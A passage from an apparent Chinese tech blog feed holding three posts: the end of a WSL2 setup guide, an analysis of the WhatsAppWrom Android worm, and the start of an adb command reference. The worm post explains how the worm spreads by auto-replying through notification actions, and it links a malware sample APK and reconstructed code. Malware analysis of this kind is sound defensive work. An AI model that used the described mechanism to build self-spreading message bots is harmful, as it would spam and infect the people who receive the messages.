<p>重启系统，然后就可以愉快的升级了，记得C 盘空余空间保持在20G以上。</p>
<h1 id="2-安装-WSL2"><a href="#2-安装-WSL2" class="headerlink" title="2. 安装 WSL2"></a>2. 安装 WSL2</h1><h2 id="2-1-第一步：启用虚拟机平台和-Linux-子系统功能"><a href="#2-1-第一步：启用虚拟机平台和-Linux-子系统功能" class="headerlink" title="2.1. 第一步：启用虚拟机平台和 Linux 子系统功能"></a>2.1. 第一步：启用虚拟机平台和 Linux 子系统功能</h2><p>以管理员权限启动 PowerShell，然后输入以下命令启用虚拟机平台：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform</span><br></pre></td></tr></table></figure>

<p>以管理员权限启动 PowerShell，然后输入以下命令启用 Linux 子系统功能：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure>
<p>在以上每一步命令执行完之后，PowerShell 中可能会提示你重新启动计算机。按“Y”可以重新启动。</p>
<p>以上操作可能需要先<a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-kernel">更新 WSL 2 Linux 内核</a>。</p>
<h2 id="2-2-启用-WSL2-并安装-linux-子系统"><a href="#2-2-启用-WSL2-并安装-linux-子系统" class="headerlink" title="2.2. 启用 WSL2 并安装 linux 子系统"></a>2.2. 启用 WSL2 并安装 linux 子系统</h2><p>使用以下命令可以在以后安装 Linux 的时候默认启用 WSL2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>
<p>去应用商店安装 linux 子系统，安装好后使用以下命令查看，可以看到 VESION 为 2 即为 wsl2 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --list --verbose</span><br><span class="line">  NAME            STATE           VERSION</span><br><span class="line">* Ubuntu-18.04    Stopped         2</span><br></pre></td></tr></table></figure>

<h2 id="2-3-自定义安装位置"><a href="#2-3-自定义安装位置" class="headerlink" title="2.3. 自定义安装位置"></a>2.3. 自定义安装位置</h2><p>下载 <a href="https://github.com/DDoSolitary/LxRunOffline/releases">LxRunOffline</a>，可以发现版本 v3.4.1 已经支持 wsl2 了。</p>
<p>执行 <code>LxRunOffline move -n &#123;version&#125; -d &#123;dir&#125;</code> ，将 Linux 移动到指定的目录。其中，<code>&#123;version&#125;</code>是版本号，可以通过 <code>LxRunOffline list</code> 来查看，<code>&#123;dir&#125;</code>是目标目录。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LxRunOffline.exe m -n Ubuntu-18.04 -d D:/WSL/Ubuntu-18.04</span><br></pre></td></tr></table></figure>
<p>最终效果，如下图：</p>
<img src="/2020/06/07/WSL2%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2020-06-07-10-44-20.png" class="">

<p>至此，整个折腾过程到此结束。</p>
<p>参考：</p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">https://docs.microsoft.com/en-us/windows/wsl/install-win10</a></p>
<p><a href="https://blog.walterlv.com/post/how-to-install-wsl2.html">https://blog.walterlv.com/post/how-to-install-wsl2.html</a></p>
<p><a href="https://answers.microsoft.com/zh-hans/windows/forum/all/%E6%9B%B4%E6%96%B0windows10%E9%81%87%E5%88%B0/5bea3327-38e0-4c20-837a-90f156655e32">https://answers.microsoft.com/zh-hans/windows/forum/all/%E6%9B%B4%E6%96%B0windows10%E9%81%87%E5%88%B0/5bea3327-38e0-4c20-837a-90f156655e32</a></p>
<p><a href="https://www.cnblogs.com/NBDWDYS2214143926/p/11543815.html">https://www.cnblogs.com/NBDWDYS2214143926/p/11543815.html</a></p>
<p><a href="https://www.bilibili.com/read/cv1429071/">https://www.bilibili.com/read/cv1429071/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>WhatsAppWrom分析过程</title>
    <url>/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<p>关于 WhatsAppWrom 的相关报告可以参考:</p>
<blockquote>
<p><a href="https://blogs.360.cn/post/Alert_new_Android_malware_spreads_through_WhatsApp.html">https://blogs.360.cn/post/Alert_new_Android_malware_spreads_through_WhatsApp.html</a></p>
</blockquote>
<p>样本md5: <a href="JebAndroidSigPlugin%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/huawei.apk">121AB9F7C0F439274478099D9E550473</a>。</p>
<p>使用 JEB 打开该样本，可以发现混淆比较严重，代码实现在 <code>com.jan.flixonlines.NotificationService.onNotificationPosted</code> 方法中实现，如下图所示：</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/2021-02-03-15-29-46.png" class="">

<p>这里有两个关键方法，需要进一步跟进，首先是进入 <code>d.a</code> 方法，可以发现混淆比较严重,如下图所示：</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/2021-02-03-15-34-33.png" class="">

<p>不过发现字符串 <code>&quot;android.wearable.EXTENSIONS&quot;</code> 未被混淆，应该可以作为突破口。结合 <code>getBundle</code> 方法，初步猜测使用了 <code>Bundle</code> 传递蠕虫消息，但是还是不太清楚原理，接着看一下 <code>v9.a</code> 方法，如下图所示：</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/2021-02-03-15-37-42.png" class="">

<p>图中框起来的表示当时分析时认为的可疑点，当时由于没有相关开发经验，也不清楚其中的原理。</p>
<p>分析到这里后，有点卡住了，然后习惯性的试了一下 Android Signature Recognizer 插件，发现恢复了部分类。其中比较关键类就是 <code>androidx.core.graphics.drawable.IconCompat</code> 。跟进之前的关键方法 <code>d.a</code> 中，发现一个 <code>a.e.d.d</code> 的类，继续跟进该类，发现了 <code>IconCompat.createWithResource</code> 方法，如下图所示：</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/2021-02-03-15-50-14.png" class="">

<p>接下来就开始 google 搜索了，首先搜索 <code>&quot;android.wearable.EXTENSIONS&quot;</code> 关键字，如下图所示：</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/2021-02-03-15-53-06.png" class="">

<p>搜索结果的第一篇文章就讲了实现原理，但是我但是分析时参考的时这一篇文章的<a href="https://github.com/hehonghui/android-tech-frontier/blob/master/issue-8/%E5%A6%82%E4%BD%95%E5%9C%A8Android%E4%B8%8A%E5%93%8D%E5%BA%94%E5%90%84%E7%A7%8D%E4%BF%A1%E6%81%AF%E9%80%9A%E7%9F%A5.md">翻译文</a>。到这里应该就已经结束了，毕竟该文章提供了源码。但是经过测试该源码后，发现不能实现相应的功能，那么就继续硬刚。</p>
<p>在 Android 提供的 <a href="https://cs.android.com/">Android Code Search
</a>页面搜索 <code>IconCompat.createWithResource</code> ，发现一段代码与 JEB 反汇编的代码类似，如下图所示：</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/2021-02-03-16-12-17.png" class="">

<p>最终发现待代码片段和 JEB 反编译的代码几乎一样，可以认为时同一个类，所以将 <code>a.e.d.d</code> 还原成了 <code>Action</code> ，后面通过类似的方法将整个 APK 关键的类都还原了，还原后的关键方法代码如下图所示：</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/2021-02-03-16-19-37.png" class="">

<p>对应的 <a href="WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/huawei.apk.jdb2">JEB 数据库</a></p>
<p>不过最终根据 APK 还原的代码还是有点问题，最终发现好像时导库的有问题。最后通过<a href="https://gist.github.com/tajchert/53f728fadae7e3e9d77a#file-wearableextendersender">链接</a>中的代码搞定了。</p>
<img src="/2021/02/03/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/%E6%95%88%E6%9E%9C%E5%9B%BE.gif" class="">

<p><a href="https://github.com/CKCat/Blog/tree/master/WhatsAppWrom%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/WhatsAppWrom">相关代码</a></p>
<p>不过今天搜索 <code>&quot;android.car.EXTENSIONS&quot;</code> 关键字，突然发现了<a href="https://stackoverflow.com/questions/46788600/automatic-reply-for-whatsapp-messages-approach">另一篇文章</a>，该文章的实现代码和 WhatsAppWrom 相似度非常高，WhatsAppWrom 开发者参考了相关代码。</p>
<p>该文章回复帖子中提到了 Android 7 以上的版本利用通知栏直接回复的功能实现自动回复，也附上了相关<a href="https://stackoverflow.com/questions/40369508/how-to-utilize-android-nougats-direct-reply-feature-with-a-notificationlistener?rq=1">文章</a>。其实最初分析这个样本的时候，也以为是利用了  Android 7 的直接回复功能，并在这里耗了一段时间，如果早点看到这一篇文章，或许分析起来就更轻松了吧。</p>
<p>简单的来个总结吧：</p>
<ol>
<li>个人代码量积累不够，各种功能需要搜索才能知道其功能，导致分析时间过长。</li>
<li>要善用搜索引擎，抓住关键字，毕竟总会有你不会的东西， 需要搜索引擎来解决。</li>
</ol>
<p>参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://medium.com/@polidea/how-to-respond-to-any-messaging-notification-on-android-7befa483e2d7</span><br><span class="line">https://github.com/hehonghui/android-tech-frontier/blob/master/issue-8/%E5%A6%82%E4%BD%95%E5%9C%A8Android%E4%B8%8A%E5%93%8D%E5%BA%94%E5%90%84%E7%A7%8D%E4%BF%A1%E6%81%AF%E9%80%9A%E7%9F%A5.md</span><br><span class="line">https://stackoverflow.com/questions/46788600/automatic-reply-for-whatsapp-messages-approach</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>awesome-adb</title>
    <url>/2020/08/06/awesome-adb/</url>
    <content><![CDATA[<blockquote>
<p>转载：<a href="https://github.com/mzlogin/awesome-adb">https://github.com/mzlogin/awesome-adb</a></p>
</blockquote>
<!-- vim-markdown-toc GFM -->

<ul>
<li><a href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">基本用法</a><ul>
<li><a href="#%E5%91%BD%E4%BB%A4%E8%AF%AD%E6%B3%95">命令语法</a></li>
<li><a href="#%E4%B8%BA%E5%91%BD%E4%BB%A4%E6%8C%87%E5%AE%9A%E7%9B%AE%E6%A0%87%E8%AE%BE%E5%A4%87">为命令指定目标设备</a></li>
<li><a href="#%E5%90%AF%E5%8A%A8%E5%81%9C%E6%AD%A2">启动&#x2F;停止</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B-adb-%E7%89%88%E6%9C%AC">查看 adb 版本</a></li>
<li><a href="#%E4%BB%A5-root-%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C-adbd">以 root 权限运行 adbd</a></li>
<li><a href="#%E6%8C%87%E5%AE%9A-adb-server-%E7%9A%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3">指定 adb server 的网络端口</a></li>
</ul>
</li>
<li><a href="#%E8%AE%BE%E5%A4%87%E8%BF%9E%E6%8E%A5%E7%AE%A1%E7%90%86">设备连接管理</a><ul>
<li><a href="#%E6%9F%A5%E8%AF%A2%E5%B7%B2%E8%BF%9E%E6%8E%A5%E8%AE%BE%E5%A4%87%E6%A8%A1%E6%8B%9F%E5%99%A8">查询已连接设备&#x2F;模拟器</a></li>
<li><a href="#usb-%E8%BF%9E%E6%8E%A5">USB 连接</a></li>
<li><a href="#%E6%97%A0%E7%BA%BF%E8%BF%9E%E6%8E%A5%E9%9C%80%E8%A6%81%E5%80%9F%E5%8A%A9-usb-%E7%BA%BF">无线连接（需要借助 USB 线）</a></li>
<li><a href="#%E6%97%A0%E7%BA%BF%E8%BF%9E%E6%8E%A5%E6%97%A0%E9%9C%80%E5%80%9F%E5%8A%A9-usb-%E7%BA%BF">无线连接（无需借助 USB 线）</a></li>
</ul>
</li>
<li><a href="#%E5%BA%94%E7%94%A8%E7%AE%A1%E7%90%86">应用管理</a><ul>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%BA%94%E7%94%A8%E5%88%97%E8%A1%A8">查看应用列表</a><ul>
<li><a href="#%E6%89%80%E6%9C%89%E5%BA%94%E7%94%A8">所有应用</a></li>
<li><a href="#%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8">系统应用</a></li>
<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8">第三方应用</a></li>
<li><a href="#%E5%8C%85%E5%90%8D%E5%8C%85%E5%90%AB%E6%9F%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BA%94%E7%94%A8">包名包含某字符串的应用</a></li>
</ul>
</li>
<li><a href="#%E5%AE%89%E8%A3%85-apk">安装 APK</a></li>
<li><a href="#%E5%8D%B8%E8%BD%BD%E5%BA%94%E7%94%A8">卸载应用</a></li>
<li><a href="#%E6%B8%85%E9%99%A4%E5%BA%94%E7%94%A8%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%BC%93%E5%AD%98">清除应用数据与缓存</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%89%8D%E5%8F%B0-activity">查看前台 Activity</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84-services">查看正在运行的 Services</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%BA%94%E7%94%A8%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF">查看应用详细信息</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%BA%94%E7%94%A8%E5%AE%89%E8%A3%85%E8%B7%AF%E5%BE%84">查看应用安装路径</a></li>
</ul>
</li>
<li><a href="#%E4%B8%8E%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BA%92">与应用交互</a><ul>
<li><a href="#%E5%90%AF%E5%8A%A8%E5%BA%94%E7%94%A8-%E8%B0%83%E8%B5%B7-activity">启动应用&#x2F; 调起 Activity</a></li>
<li><a href="#%E8%B0%83%E8%B5%B7-service">调起 Service</a></li>
<li><a href="#%E5%81%9C%E6%AD%A2-service">停止 Service</a></li>
<li><a href="#%E5%8F%91%E9%80%81%E5%B9%BF%E6%92%AD">发送广播</a></li>
<li><a href="#%E5%BC%BA%E5%88%B6%E5%81%9C%E6%AD%A2%E5%BA%94%E7%94%A8">强制停止应用</a></li>
<li><a href="#%E6%94%B6%E7%B4%A7%E5%86%85%E5%AD%98">收紧内存</a></li>
</ul>
</li>
<li><a href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86">文件管理</a><ul>
<li><a href="#%E5%A4%8D%E5%88%B6%E8%AE%BE%E5%A4%87%E9%87%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%B0%E7%94%B5%E8%84%91">复制设备里的文件到电脑</a></li>
<li><a href="#%E5%A4%8D%E5%88%B6%E7%94%B5%E8%84%91%E9%87%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%B0%E8%AE%BE%E5%A4%87">复制电脑里的文件到设备</a></li>
</ul>
</li>
<li><a href="#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5">模拟按键&#x2F;输入</a><ul>
<li><a href="#%E7%94%B5%E6%BA%90%E9%94%AE">电源键</a></li>
<li><a href="#%E8%8F%9C%E5%8D%95%E9%94%AE">菜单键</a></li>
<li><a href="#home-%E9%94%AE">HOME 键</a></li>
<li><a href="#%E8%BF%94%E5%9B%9E%E9%94%AE">返回键</a></li>
<li><a href="#%E9%9F%B3%E9%87%8F%E6%8E%A7%E5%88%B6">音量控制</a></li>
<li><a href="#%E5%AA%92%E4%BD%93%E6%8E%A7%E5%88%B6">媒体控制</a></li>
<li><a href="#%E7%82%B9%E4%BA%AE%E7%86%84%E7%81%AD%E5%B1%8F%E5%B9%95">点亮&#x2F;熄灭屏幕</a></li>
<li><a href="#%E6%BB%91%E5%8A%A8%E8%A7%A3%E9%94%81">滑动解锁</a></li>
<li><a href="#%E8%BE%93%E5%85%A5%E6%96%87%E6%9C%AC">输入文本</a></li>
</ul>
</li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E6%97%A5%E5%BF%97">查看日志</a><ul>
<li><a href="#android-%E6%97%A5%E5%BF%97">Android 日志</a><ul>
<li><a href="#%E6%8C%89%E7%BA%A7%E5%88%AB%E8%BF%87%E6%BB%A4%E6%97%A5%E5%BF%97">按级别过滤日志</a></li>
<li><a href="#%E6%8C%89-tag-%E5%92%8C%E7%BA%A7%E5%88%AB%E8%BF%87%E6%BB%A4%E6%97%A5%E5%BF%97">按 tag 和级别过滤日志</a></li>
<li><a href="#%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F">日志格式</a></li>
<li><a href="#%E6%B8%85%E7%A9%BA%E6%97%A5%E5%BF%97">清空日志</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E6%A0%B8%E6%97%A5%E5%BF%97">内核日志</a></li>
</ul>
</li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E8%AE%BE%E5%A4%87%E4%BF%A1%E6%81%AF">查看设备信息</a><ul>
<li><a href="#%E5%9E%8B%E5%8F%B7">型号</a></li>
<li><a href="#%E7%94%B5%E6%B1%A0%E7%8A%B6%E5%86%B5">电池状况</a></li>
<li><a href="#%E5%B1%8F%E5%B9%95%E5%88%86%E8%BE%A8%E7%8E%87">屏幕分辨率</a></li>
<li><a href="#%E5%B1%8F%E5%B9%95%E5%AF%86%E5%BA%A6">屏幕密度</a></li>
<li><a href="#%E6%98%BE%E7%A4%BA%E5%B1%8F%E5%8F%82%E6%95%B0">显示屏参数</a></li>
<li><a href="#android_id">android_id</a></li>
<li><a href="#imei">IMEI</a></li>
<li><a href="#android-%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC">Android 系统版本</a></li>
<li><a href="#ip-%E5%9C%B0%E5%9D%80">IP 地址</a></li>
<li><a href="#mac-%E5%9C%B0%E5%9D%80">Mac 地址</a></li>
<li><a href="#cpu-%E4%BF%A1%E6%81%AF">CPU 信息</a></li>
<li><a href="#%E5%86%85%E5%AD%98%E4%BF%A1%E6%81%AF">内存信息</a></li>
<li><a href="#%E6%9B%B4%E5%A4%9A%E7%A1%AC%E4%BB%B6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%B1%9E%E6%80%A7">更多硬件与系统属性</a></li>
</ul>
</li>
<li><a href="#%E4%BF%AE%E6%94%B9%E8%AE%BE%E7%BD%AE">修改设置</a><ul>
<li><a href="#%E5%88%86%E8%BE%A8%E7%8E%87">分辨率</a></li>
<li><a href="#%E5%B1%8F%E5%B9%95%E5%AF%86%E5%BA%A6-1">屏幕密度</a></li>
<li><a href="#%E6%98%BE%E7%A4%BA%E5%8C%BA%E5%9F%9F">显示区域</a></li>
<li><a href="#%E5%85%B3%E9%97%AD-usb-%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F">关闭 USB 调试模式</a></li>
<li><a href="#%E5%85%81%E8%AE%B8%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE%E9%9D%9E-sdk-api">允许&#x2F;禁止访问非 SDK API</a></li>
<li><a href="#%E7%8A%B6%E6%80%81%E6%A0%8F%E5%92%8C%E5%AF%BC%E8%88%AA%E6%A0%8F%E7%9A%84%E6%98%BE%E7%A4%BA%E9%9A%90%E8%97%8F">状态栏和导航栏的显示隐藏</a></li>
</ul>
</li>
<li><a href="#%E5%AE%9E%E7%94%A8%E5%8A%9F%E8%83%BD">实用功能</a><ul>
<li><a href="#%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">屏幕截图</a></li>
<li><a href="#%E5%BD%95%E5%88%B6%E5%B1%8F%E5%B9%95">录制屏幕</a></li>
<li><a href="#%E9%87%8D%E6%96%B0%E6%8C%82%E8%BD%BD-system-%E5%88%86%E5%8C%BA%E4%B8%BA%E5%8F%AF%E5%86%99">重新挂载 system 分区为可写</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84-wifi-%E5%AF%86%E7%A0%81">查看连接过的 WiFi 密码</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE%E7%B3%BB%E7%BB%9F%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4">设置系统日期和时间</a></li>
<li><a href="#%E9%87%8D%E5%90%AF%E6%89%8B%E6%9C%BA">重启手机</a></li>
<li><a href="#%E6%A3%80%E6%B5%8B%E8%AE%BE%E5%A4%87%E6%98%AF%E5%90%A6%E5%B7%B2-root">检测设备是否已 root</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8-monkey-%E8%BF%9B%E8%A1%8C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95">使用 Monkey 进行压力测试</a></li>
<li><a href="#%E5%BC%80%E5%90%AF%E5%85%B3%E9%97%AD-wifi">开启&#x2F;关闭 WiFi</a></li>
</ul>
</li>
<li><a href="#%E5%88%B7%E6%9C%BA%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4">刷机相关命令</a><ul>
<li><a href="#%E9%87%8D%E5%90%AF%E5%88%B0-recovery-%E6%A8%A1%E5%BC%8F">重启到 Recovery 模式</a></li>
<li><a href="#%E4%BB%8E-recovery-%E9%87%8D%E5%90%AF%E5%88%B0-android">从 Recovery 重启到 Android</a></li>
<li><a href="#%E9%87%8D%E5%90%AF%E5%88%B0-fastboot-%E6%A8%A1%E5%BC%8F">重启到 Fastboot 模式</a></li>
<li><a href="#%E9%80%9A%E8%BF%87-sideload-%E6%9B%B4%E6%96%B0%E7%B3%BB%E7%BB%9F">通过 sideload 更新系统</a></li>
</ul>
</li>
<li><a href="#%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4">安全相关命令</a><ul>
<li><a href="#%E5%90%AF%E7%94%A8%E7%A6%81%E7%94%A8-selinux">启用&#x2F;禁用 SELinux</a></li>
<li><a href="#%E5%90%AF%E7%94%A8%E7%A6%81%E7%94%A8-dm_verity">启用&#x2F;禁用 dm_verity</a></li>
</ul>
</li>
<li><a href="#%E6%9B%B4%E5%A4%9A-adb-shell-%E5%91%BD%E4%BB%A4">更多 adb shell 命令</a><ul>
<li><a href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B">查看进程</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E5%AE%9E%E6%97%B6%E8%B5%84%E6%BA%90%E5%8D%A0%E7%94%A8%E6%83%85%E5%86%B5">查看实时资源占用情况</a></li>
<li><a href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B-uid">查看进程 UID</a></li>
<li><a href="#%E5%85%B6%E5%AE%83">其它</a></li>
</ul>
</li>
<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a><ul>
<li><a href="#%E5%90%AF%E5%8A%A8-adb-server-%E5%A4%B1%E8%B4%A5">启动 adb server 失败</a></li>
<li><a href="#comandroidddmlibadbcommandrejectedexception">com.android.ddmlib.AdbCommandRejectedException</a></li>
</ul>
</li>
<li><a href="#adb-%E7%9A%84%E9%9D%9E%E5%AE%98%E6%96%B9%E5%AE%9E%E7%8E%B0">adb 的非官方实现</a></li>
<li><a href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4">相关命令</a></li>
<li><a href="#%E8%87%B4%E8%B0%A2">致谢</a></li>
<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
</ul>
<!-- vim-markdown-toc -->

<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="命令语法"><a href="#命令语法" class="headerlink" title="命令语法"></a>命令语法</h3><p>adb 命令的基本语法如下：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb [-d|-e|-s &lt;serialNumber&gt;] &lt;<span class="built_in">command</span>&gt;</span><br></pre></td></tr></table></figure>

<p>如果只有一个设备&#x2F;模拟器连接时，可以省略掉 <code>[-d|-e|-s &lt;serialNumber&gt;]</code> 这一部分，直接使用 <code>adb &lt;command&gt;</code>。</p>
<h3 id="为命令指定目标设备"><a href="#为命令指定目标设备" class="headerlink" title="为命令指定目标设备"></a>为命令指定目标设备</h3><p>如果有多个设备&#x2F;模拟器连接，则需要为命令指定目标设备。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>指定当前唯一通过 USB 连接的 Android 设备为命令目标</td>
</tr>
<tr>
<td>-e</td>
<td>指定当前唯一运行的模拟器为命令目标</td>
</tr>
<tr>
<td><code>-s &lt;serialNumber&gt;</code></td>
<td>指定相应 serialNumber 号的设备&#x2F;模拟器为命令目标</td>
</tr>
</tbody></table>
<p>在多个设备&#x2F;模拟器连接的情况下较常用的是 <code>-s &lt;serialNumber&gt;</code> 参数，serialNumber 可以通过 <code>adb devices</code> 命令获取。如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ adb devices</span><br><span class="line"></span><br><span class="line">List of devices attached</span><br><span class="line">cf264b8f	device</span><br><span class="line">emulator-5554	device</span><br><span class="line">10.129.164.6:5555	device</span><br></pre></td></tr></table></figure>

<p>输出里的 <code>cf264b8f</code>、<code>emulator-5554</code> 和 <code>10.129.164.6:5555</code> 即为 serialNumber。</p>
<p>比如这时想指定 <code>cf264b8f</code> 这个设备来运行 adb 命令获取屏幕分辨率：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb -s cf264b8f shell wm size</span><br></pre></td></tr></table></figure>

<p>又如想给 <code>10.129.164.6:5555</code> 这个设备安装应用（<em>这种形式的 serialNumber 格式为 <code>&lt;IP&gt;:&lt;Port&gt;</code>，一般为无线连接的设备或 Genymotion 等第三方 Android 模拟器</em>）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb -s 10.129.164.6:5555 install test.apk</span><br></pre></td></tr></table></figure>

<p><strong>遇到多设备&#x2F;模拟器的情况均使用这几个参数为命令指定目标设备，下文中为简化描述，不再重复。</strong></p>
<h3 id="启动-x2F-停止"><a href="#启动-x2F-停止" class="headerlink" title="启动&#x2F;停止"></a>启动&#x2F;停止</h3><p>启动 adb server 命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb start-server</span><br></pre></td></tr></table></figure>

<p>（一般无需手动执行此命令，在运行 adb 命令时若发现 adb server 没有启动会自动调起。）</p>
<p>停止 adb server 命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb kill-server</span><br></pre></td></tr></table></figure>

<h3 id="查看-adb-版本"><a href="#查看-adb-版本" class="headerlink" title="查看 adb 版本"></a>查看 adb 版本</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb version</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Android Debug Bridge version 1.0.36</span><br><span class="line">Revision 8f855a3d9b35-android</span><br></pre></td></tr></table></figure>

<h3 id="以-root-权限运行-adbd"><a href="#以-root-权限运行-adbd" class="headerlink" title="以 root 权限运行 adbd"></a>以 root 权限运行 adbd</h3><p>adb 的运行原理是 PC 端的 adb server 与手机端的守护进程 adbd 建立连接，然后 PC 端的 adb client 通过 adb server 转发命令，adbd 接收命令后解析运行。</p>
<p>所以如果 adbd 以普通权限执行，有些需要 root 权限才能执行的命令无法直接用 <code>adb xxx</code> 执行。这时可以 <code>adb shell</code> 然后 <code>su</code> 后执行命令，也可以让 adbd 以 root 权限执行，这个就能随意执行高权限命令了。</p>
<p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb root</span><br></pre></td></tr></table></figure>

<p>正常输出：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">restarting adbd as root</span><br></pre></td></tr></table></figure>

<p>现在再运行 <code>adb shell</code>，看看命令行提示符是不是变成 <code>#</code> 了？</p>
<p>有些手机 root 后也无法通过 <code>adb root</code> 命令让 adbd 以 root 权限执行，比如三星的部分机型，会提示 <code>adbd cannot run as root in production builds</code>，此时可以先安装 adbd Insecure，然后 <code>adb root</code> 试试。</p>
<p>相应地，如果要恢复 adbd 为非 root 权限的话，可以使用 <code>adb unroot</code> 命令。</p>
<h3 id="指定-adb-server-的网络端口"><a href="#指定-adb-server-的网络端口" class="headerlink" title="指定 adb server 的网络端口"></a>指定 adb server 的网络端口</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb -P &lt;port&gt; start-server</span><br></pre></td></tr></table></figure>

<p>默认端口为 5037。</p>
<h2 id="设备连接管理"><a href="#设备连接管理" class="headerlink" title="设备连接管理"></a>设备连接管理</h2><h3 id="查询已连接设备-x2F-模拟器"><a href="#查询已连接设备-x2F-模拟器" class="headerlink" title="查询已连接设备&#x2F;模拟器"></a>查询已连接设备&#x2F;模拟器</h3><p>命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
